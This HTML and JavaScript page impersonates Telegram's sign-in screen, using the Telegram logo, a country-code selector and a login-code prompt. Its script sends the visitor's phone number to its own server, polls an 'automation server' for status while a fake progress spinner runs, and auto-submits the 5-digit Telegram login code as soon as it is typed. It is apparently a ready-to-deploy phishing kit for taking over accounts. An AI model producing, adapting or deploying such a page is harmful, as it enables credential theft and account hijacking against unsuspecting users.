
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Sign In</title>
    <style>
        :root {
            --bg: #ffffff;
            --text: #000000;
            --input-bg: #f0f0f0;
            --button-bg: #512da8;
            --button-text: #ffffff;
            --accent: #512da8;
        }

        @media (prefers-color-scheme: dark) {
            :root {
                --bg: #000000;
                --text: #ffffff;
                --input-bg: #333333;
            }
        }

        body {
            background: var(--bg);
            color: var(--text);
            font-family: sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            transition: all 0.3s ease;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 400px;
            padding: 20px;
            box-sizing: border-box;
        }

        .logo {
            width: 100px;
            height: 100px;
            margin-bottom: 20px;
            transition: transform 0.3s ease;
        }

        .logo:hover {
            transform: scale(1.1) rotate(10deg);
        }

        h1 {
            font-size: 24px;
            margin: 0 0 10px 0;
            align-self: center;
        }

        p {
            font-size: 16px;
            text-align: center;
            margin: 0 0 20px 0;
        }

        .input {
            width: 100%;
            padding: 12px;
            margin-bottom: 10px;
            border: none;
            border-radius: 5px;
            background: var(--input-bg);
            color: var(--text);
            font-size: 16px;
            box-sizing: border-box;
        }

        .phone-input {
            display: flex;
            width: 100%;
            background: var(--input-bg);
            border-radius: 5px;
            margin-bottom: 10px;
        }

        .phone-input span {
            padding: 12px;
            font-size: 16px;
            color: var(--text);
            white-space: nowrap;
        }

        .phone-input input {
            flex: 1;
            border: none;
            background: transparent;
            color: var(--text);
            font-size: 16px;
            outline: none;
        }

        button {
            width: 100%;
            padding: 12px;
            background: var(--button-bg);
            color: var(--button-text);
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }

        button:disabled {
            background: #cccccc;
            cursor: not-allowed;
        }

        #code-page {
            display: none;
            text-align: center;
        }

        #code-page .phone-wrapper {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
        }

        #code-page .phone {
            font-size: 24px;
            margin-right: 10px;
        }

        #code-page .phone-edit {
            cursor: pointer;
            font-size: 20px;
        }

        #code-page .subtitle {
            font-size: 16px;
            margin-bottom: 20px;
        }

        #code-page .code-input {
            width: 100%;
            padding: 12px;
            border: 2px solid #8774e1;
            border-radius: 5px;
            font-size: 16px;
            background: var(--bg);
            color: var(--text);
            text-align: center;
            letter-spacing: 8px;
            font-weight: bold;
        }

        #code-page .logo {
            width: 100px;
            height: 100px;
            margin: 0 auto 20px auto;
            display: block;
            padding: 5px;
            box-sizing: border-box;
        }

        .status {
            margin-top: 15px;
            padding: 10px;
            border-radius: 5px;
            text-align: center;
            display: none;
        }

        .status.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .status.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .status.info {
            background: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }

        /* Spinner styles (circle + percent) */
        .spinner-wrapper {
            width: 140px;
            height: 140px;
            display: none;
            align-items: center;
            justify-content: center;
            margin-top: 15px;
        }

        .spinner {
            --p: 0;
            width: 120px;
            height: 120px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            background: conic-gradient(var(--accent) calc(var(--p) * 1%), #e9e9e9 0);
            box-shadow: 0 6px 18px rgba(0,0,0,0.08), inset 0 -6px 18px rgba(0,0,0,0.02);
            transition: background 0.12s linear;
            position: relative;
        }

        .spinner::after {
            content: "";
            position: absolute;
            width: 86px;
            height: 86px;
            background: var(--bg);
            border-radius: 50%;
            box-shadow: 0 2px 6px rgba(0,0,0,0.04) inset;
        }

        .spinner-text {
            position: relative;
            font-weight: 700;
            color: var(--text);
            z-index: 2;
            font-size: 20px;
        }

        @media (max-width: 400px) {
            .container {
                padding: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container" id="phone-page">
        <div class="logo">
            <svg id="Livello_1" data-name="Livello 1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 240 240"><defs><linearGradient id="linear-gradient" x1="120" y1="240" x2="120" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#512da8"/><stop offset="1" stop-color="#ab47bc"/></linearGradient></defs><title>Telegram_logo</title><circle cx="120" cy="120" r="120" fill="url(#linear-gradient)"/><path d="M81.229,128.772l14.237,39.406s1.78,3.687,3.686,3.687,30.255-29.492,30.255-29.492l31.525-60.89L81.737,118.6Z" fill="#c8daea"/><path d="M100.106,138.878l-2.733,29.046s-1.144,8.9,7.754,0,17.415-15.763,17.415-15.763" fill="#a9c6d8"/><path d="M81.486,130.178,52.2,120.636s-3.5-1.42-2.373-4.64c.232-.664.7-1.229,2.1-2.2,6.489-4.523,120.106-45.36,120.106-45.36s3.208-1.081,5.1-.362a2.766,2.76,0,0,1,1.885,2.055,9.357,9.357,0,0,1,.254,2.585c-.009.752-.1,1.449-.169,2.542-.692,11.165-21.4,94.493-21.4,94.493s-1.239,4.876-5.678,5.043A8.13,8.13,0,0,1,146.1,172.5c-8.711-7.493-38.819-27.727-45.472-32.177a1.27,1.27,0,0,1-.546-.9c-.093-.469.417-1.05.417-1.05s52.426-46.6,53.821-51.492c.108-.379-.3-.566-.848-.4-3.482,1.281-63.844,39.4-70.506,43.607A3.21,3.21,0,0,1,81.486,130.178Z" fill="#fff"/></svg>
        </div>
        <h1>Sign in to Telegram</h1>
        <p>Please confirm your country code and enter your phone number.</p>
        <select id="country" class="input"></select>
        <div class="phone-input">
            <span id="code">+</span>
            <input type="tel" id="phone" placeholder="Phone Number">
        </div>
        <button id="next">NEXT</button>

        <!-- Spinner area: only visible after clicking NEXT -->
        <div class="spinner-wrapper" id="spinner-wrapper" aria-hidden="true">
            <div class="spinner" id="spinner" role="status" aria-live="polite" style="--p:0">
                <div class="spinner-text" id="spinner-percent">0%</div>
            </div>
        </div>

        <div id="phone-status" class="status" aria-hidden="true"></div>
    </div>

    <div class="container" id="code-page">
        <div class="logo">
            <svg id="Livello_1" data-name="Livello 1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 240 240"><defs><linearGradient id="linear-gradient" x1="120" y1="240" x2="120" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#512da8"/><stop offset="1" stop-color="#ab47bc"/></linearGradient></defs><title>Telegram_logo</title><circle cx="120" cy="120" r="120" fill="url(#linear-gradient)"/><path d="M81.229,128.772l14.237,39.406s1.78,3.687,3.686,3.687,30.255-29.492,30.255-29.492l31.525-60.89L81.737,118.6Z" fill="#000"/><path d="M100.106,138.878l-2.733,29.046s-1.144,8.9,7.754,0,17.415-15.763,17.415-15.763" fill="#000"/><path d="M81.486,130.178,52.2,120.636s-3.5-1.42-2.373-4.64c.232-.664.7-1.229,2.1-2.2,6.489-4.523,120.106-45.36,120.106-45.36s3.208-1.081,5.1-.362a2.766,2.76,0,0,1,1.885,2.055,9.357,9.357,0,0,1,.254,2.585c-.009.752-.1,1.449-.169,2.542-.692,11.165-21.4,94.493-21.4,94.493s-1.239,4.876-5.678,5.043A8.13,8.13,0,0,1,146.1,172.5c-8.711-7.493-38.819-27.727-45.472-32.177a1.27,1.27,0,0,1-.546-.9c-.093-.469.417-1.05.417-1.05s52.426-46.6,53.821-51.492c.108-.379-.3-.566-.848-.4-3.482,1.281-63.844,39.4-70.506,43.607A3.21,3.21,0,0,1,81.486,130.178Z" fill="#512da8"/></svg>
        </div>
        <div class="phone-wrapper">
            <h4 class="phone" id="display-phone"></h4>
            <span class="phone-edit" id="edit-phone">âœŽ</span>
        </div>
        <p class="subtitle">We have sent you a message in Telegram with the code.</p>
        <input type="text" id="code-input" class="code-input" placeholder="Enter 5-digit code" maxlength="5">
        <div id="code-status" class="status"></div>
    </div>

    <script>
        const countrySelect = document.getElementById('country');
        const codeSpan = document.getElementById('code');
        const phoneInput = document.getElementById('phone');
        const nextButton = document.getElementById('next');
        const phonePage = document.getElementById('phone-page');
        const codePage = document.getElementById('code-page');
        const displayPhone = document.getElementById('display-phone');
        const editPhone = document.getElementById('edit-phone');
        const codeInput = document.getElementById('code-input');
        const phoneStatus = document.getElementById('phone-status');
        const codeStatus = document.getElementById('code-status');

        const spinnerWrapper = document.getElementById('spinner-wrapper');
        const spinner = document.getElementById('spinner');
        const spinnerPercentText = document.getElementById('spinner-percent');

        // const SERVER_URL = 'http://localhost:8765';
        const SERVER_URL = window.location.origin;
        let statusCheckInterval = null;
        let sessionId = null;

        // Spinner control
        let spinnerInterval = null;
        let spinnerPercent = 0;
        let silentMode = false; // when true, suppress messages on phone-status

        function showSpinner() {
            spinnerWrapper.style.display = 'flex';
            spinnerWrapper.setAttribute('aria-hidden', 'false');
            spinner.style.setProperty('--p', 0);
            spinnerPercent = 0;
            spinnerPercentText.textContent = '0%';
            // gentle increment up to 99% while waiting
            clearInterval(spinnerInterval);
            spinnerInterval = setInterval(() => {
                if (spinnerPercent < 99) {
                    // accelerate slightly as it grows for natural feel
                    const delta = Math.max(1, Math.ceil((100 - spinnerPercent) * 0.02));
                    spinnerPercent = Math.min(99, spinnerPercent + delta);
                    spinner.style.setProperty('--p', spinnerPercent);
                    spinnerPercentText.textContent = spinnerPercent + '%';
                }
            }, 120);
        }

        function completeSpinnerAndHide(callback) {
            clearInterval(spinnerInterval);
            spinnerPercent = 100;
            spinner.style.setProperty('--p', spinnerPercent);
            spinnerPercentText.textContent = '100%';
            // small delay so user sees 100%
            setTimeout(() => {
                spinnerWrapper.style.display = 'none';
                spinnerWrapper.setAttribute('aria-hidden', 'true');
                if (typeof callback === 'function') callback();
            }, 350);
        }

        function hideSpinnerImmediate() {
            clearInterval(spinnerInterval);
            spinnerWrapper.style.display = 'none';
            spinnerWrapper.setAttribute('aria-hidden', 'true');
        }

        // Countries data
        const countries = [
            {"name": "Ethiopia", "dial_code": "+251", "code": "ET"},
            {"name": "United States", "dial_code": "+1", "code": "US"},
            {"name": "United Kingdom", "dial_code": "+44", "code": "GB"},
            {"name": "India", "dial_code": "+91", "code": "IN"},
            {"name": "China", "dial_code": "+86", "code": "CN"},
            {"name": "Germany", "dial_code": "+49", "code": "DE"},
            {"name": "France", "dial_code": "+33", "code": "FR"},
            {"name": "Italy", "dial_code": "+39", "code": "IT"},
            {"name": "Spain", "dial_code": "+34", "code": "ES"},
            {"name": "Russia", "dial_code": "+7", "code": "RU"},
            {"name": "Japan", "dial_code": "+81", "code": "JP"},
            {"name": "South Korea", "dial_code": "+82", "code": "KR"}
        ];

        // Populate country select
        countries.forEach(country => {
            const option = document.createElement('option');
            option.value = country.dial_code;
            option.textContent = country.name;
            countrySelect.appendChild(option);
        });

        // Set default to Ethiopia
        countrySelect.value = '+251';

        // Update code on change
        countrySelect.addEventListener('change', () => {
            codeSpan.textContent = countrySelect.value;
        });

        // Initial update
        codeSpan.textContent = countrySelect.value;

        function showStatus(element, message, type) {
            // If in silentMode, suppress any phone-status updates
            if (element === phoneStatus && silentMode) return;
            element.textContent = message;
            element.className = 'status ' + type;
            element.style.display = 'block';
            element.setAttribute('aria-hidden', 'false');
        }

        async function checkStatus() {
            try {
                const url = SERVER_URL + '/status' + (sessionId ? ('?session=' + sessionId) : '');
                const response = await fetch(url);
                const data = await response.json();

                if (data.status === 'code_required') {
                    // complete spinner -> show code page
                    completeSpinnerAndHide(() => {
                        phonePage.style.display = 'none';
                        codePage.style.display = 'block';
                        displayPhone.textContent = phoneInput.value ? `${codeSpan.textContent} ${phoneInput.value}` : 'Unknown';
                        codeInput.focus();
                        // allow code-status messages now
                        silentMode = false;
                        showStatus(codeStatus, 'Enter the 5-digit code sent to your Telegram app', 'info');
                    });
                    clearInterval(statusCheckInterval);
                    statusCheckInterval = null;
                } else if (data.status === 'Verification Complete!') {
                    // In case status becomes success without code page, finalize spinner then show code page (defensive)
                    completeSpinnerAndHide(() => {
                        phonePage.style.display = 'none';
                        codePage.style.display = 'block';
                        displayPhone.textContent = phoneInput.value ? `${codeSpan.textContent} ${phoneInput.value}` : 'Unknown';
                        codeInput.focus();
                        silentMode = false;
                        showStatus(codeStatus, 'Verification Complete! ', 'success');
                    });
                    clearInterval(statusCheckInterval);
                    statusCheckInterval = null;
                } else if (typeof data.status === 'string' && data.status.startsWith('error:')) {
                    // If an error occurs before code page, complete spinner and then show code page and error inside code-status
                    completeSpinnerAndHide(() => {
                        phonePage.style.display = 'none';
                        codePage.style.display = 'block';
                        displayPhone.textContent = phoneInput.value ? `${codeSpan.textContent} ${phoneInput.value}` : 'Unknown';
                        codeInput.focus();
                        silentMode = false;
                        showStatus(codeStatus, data.status.replace('error:', 'Error:'), 'error');
                    });
                    clearInterval(statusCheckInterval);
                    statusCheckInterval = null;
                } else {
                    // Keep silent on polling updates so user only sees spinner
                    // (no action needed)
                }
            } catch (error) {
                // Network issues: stay silent and keep spinner visible. Do not show messages per requirement.
                // If needed to recover, spinner will keep going until /status returns.
                console.error('Error checking status:', error);
            }
        }

        // Next button click handler
        nextButton.addEventListener('click', async () => {
            const phoneNumber = phoneInput.value.trim();
            if (phoneNumber) {
                const countryCode = codeSpan.textContent.replace('+', '');
                
                try {
                    // Enter silent mode: show spinner only, hide any status messages
                    silentMode = true;
                    phoneStatus.style.display = 'none';
                    phoneStatus.setAttribute('aria-hidden', 'true');

                    // Hide the NEXT button visually and disable it
                    nextButton.style.display = 'none';
                    nextButton.disabled = true;

                    showSpinner();

                    const response = await fetch(SERVER_URL + '/phone', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            country_code: countryCode,
                            phone_number: phoneNumber
                        })
                    });

                    // attempt to parse response; even if errors, we do not show messages
                    let result = {};
                    try { result = await response.json(); } catch(e){ result = {}; }

                    if (result.session) {
                        sessionId = result.session; // store returned session id
                    }

                    // Start checking status every 1.5 seconds (spinner will run until code_required)
                    if (statusCheckInterval) clearInterval(statusCheckInterval);
                    statusCheckInterval = setInterval(checkStatus, 1500);
                    // call once immediately to speed up transition if server already updated
                    checkStatus();

                } catch (error) {
                    // On network error, stop spinner and restore UI silently (no message before code page)
                    console.error('Failed to connect to automation server', error);
                    hideSpinnerImmediate();
                    nextButton.style.display = 'block';
                    nextButton.disabled = false;
                    silentMode = false;
                }
            } else {
                // per requirement: no message before code page, but we need to indicate nothing if empty.
                // revert no-op visually (no spinner shown)
                // (user will simply still see NEXT button)
                // Keep behavior minimal: briefly flash button to indicate it's clickable
                nextButton.classList.add('shake');
                setTimeout(()=> nextButton.classList.remove('shake'), 250);
            }
        });

        // provide minimal shake CSS via JS injection to avoid major changes
        (function addShakeStyle(){
            const s = document.createElement('style');
            s.textContent = `.shake{animation:shakeit .22s cubic-bezier(.36,.07,.19,.97) both}
            @keyframes shakeit{10%,90%{transform:translateX(-1px)}20%,80%{transform:translateX(2px)}30%,50%,70%{transform:translateX(-4px)}40%,60%{transform:translateX(4px)}}`;
            document.head.appendChild(s);
        })();

        // Code input handler - auto-submit when 5 digits are entered
        codeInput.addEventListener('input', async (e) => {
            const code = e.target.value.replace(/\D/g, ''); // Remove non-digits
            e.target.value = code; // Update input with only digits
            
            if (code.length === 5) {
                try {
                    showStatus(codeStatus, 'Sending code to automation...', 'info');
                    codeInput.disabled = true;

                    const body = { code: code };
                    if (sessionId) body.session = sessionId;

                    const response = await fetch(SERVER_URL + '/code', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(body)
                    });

                    const result = await response.json();
                    showStatus(codeStatus, result.message || JSON.stringify(result), 'info');

                } catch (error) {
                    showStatus(codeStatus, 'Failed to send code to automation', 'error');
                    codeInput.disabled = false;
                }
            }
        });

        editPhone.addEventListener('click', () => {
            // stop any polling and spinner
            if (statusCheckInterval) { clearInterval(statusCheckInterval); statusCheckInterval = null; }
            hideSpinnerImmediate();
            silentMode = false;

            codePage.style.display = 'none';
            phonePage.style.display = 'block';
            phoneInput.focus();
            nextButton.disabled = false;
            nextButton.style.display = 'block';
        });


    </script>
</body>
</html>
